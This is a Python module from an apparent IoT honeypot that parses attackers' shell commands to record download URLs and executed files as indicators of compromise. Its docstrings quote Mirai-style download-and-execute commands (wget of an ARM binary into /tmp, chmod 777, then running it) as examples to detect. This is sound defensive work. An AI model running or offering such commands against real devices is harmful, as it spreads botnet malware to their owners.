"""
HoneyBot-IoT — command-line intelligence shared by the fake and the real shell.

In the real (sandboxed) shell the attacker's commands actually run, so HoneyBot
no longer interprets them itself. It still has to recognise, from the command
line alone, what the attacker is trying to do:

    download_targets("cd /tmp; wget 1.2.3.4/bins/arm7 -O a")  →  [("http://1.2.3.4/bins/arm7", "wget")]
    exec_targets("chmod 777 a; ./a telnet.arm")               →  ["./a"]

URLs are only recorded as IOCs. Nothing here opens a connection.
"""

import re
import shlex
import posixpath

URL_RE = re.compile(r"""((?:https?|ftp|tftp)://[^\s'";|&<>`)]+)""", re.I)
HOST_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?$")
_SPLIT_RE = re.compile(r"\|\||&&|[;|&\n]")
_EXEC_RE = re.compile(r"^(?:\./\S+|/(?:tmp|var/tmp|dev/shm|root|home|var/run|mnt)/\S+)$")


def normalize_url(target, scheme="http"):
    """`198.51.100.23/bins/arm7` → `http://198.51.100.23/bins/arm7` (bots often omit
    the scheme; BusyBox wget/curl default to http)."""
    target = target.strip("'\"")
    if re.match(r"^[a-z][a-z0-9+.-]*://", target, re.I):
        return target
    return f"{scheme}://{target}"


def segments(line):
    """Split a command line on ; && || | & and newlines, then shell-split each part."""
    for part in _SPLIT_RE.split(line or ""):
        part = part.strip()
        if not part:
            continue
        try:
            argv = shlex.split(part, posix=True)
        except ValueError:
            argv = part.split()
        if argv:
            yield argv


def _looks_like_target(arg):
    if arg.startswith("-"):
        return False
    return bool(URL_RE.match(arg) or HOST_RE.match(arg.split("/")[0])
                or re.match(r"^[\w.-]+\.[a-z]{2,}(?::\d+)?/", arg, re.I))


def download_targets(line):
    """Every (url, tool) the line tries to fetch, in order, without duplicates."""
    found = []

    def add(url, tool):
        url = url.rstrip(".,;")
        if url not in (u for u, _ in found):
            found.append((url, tool))

    for argv in segments(line):
        name = posixpath.basename(argv[0])
        args = argv[1:]
        if name == "busybox" and args:
            name, args = args[0], args[1:]
        if name in ("wget", "curl"):
            for a in args:
                if _looks_like_target(a):
                    add(normalize_url(a), name)
                    break
        elif name == "tftp":
            host = next((a for a in args if HOST_RE.match(a)), None)
            rfile = args[args.index("-r") + 1] if "-r" in args and args.index("-r") + 1 < len(args) else None
            if host and rfile:
                add(f"tftp://{host}/{rfile.lstrip('/')}", "tftp")
        elif name == "ftpget":
            # busybox ftpget [-cvu] [-u USER] [-p PASS] [-P PORT] HOST LOCAL REMOTE
            pos, skip = [], False
            for a in args:
                if skip:
                    skip = False
                    continue
                if a in ("-u", "-p", "-P"):
                    skip = True
                    continue
                if not a.startswith("-"):
                    pos.append(a)
            if len(pos) >= 3:
                add(f"ftp://{pos[0]}/{pos[2].lstrip('/')}", "ftpget")
    for url in URL_RE.findall(line or ""):
        add(url, None)
    return found


def exec_targets(line):
    """Files the attacker runs directly (`./x`, `/tmp/x`, `sh x.sh`) — not builtins."""
    out = []
    for argv in segments(line):
        cmd = argv[0]
        if posixpath.basename(cmd) in ("sh", "ash", "bash") and len(argv) > 1 and not argv[1].startswith("-"):
            cmd = argv[1]
        if _EXEC_RE.match(cmd) and cmd not in out:
            out.append(cmd)
    return out
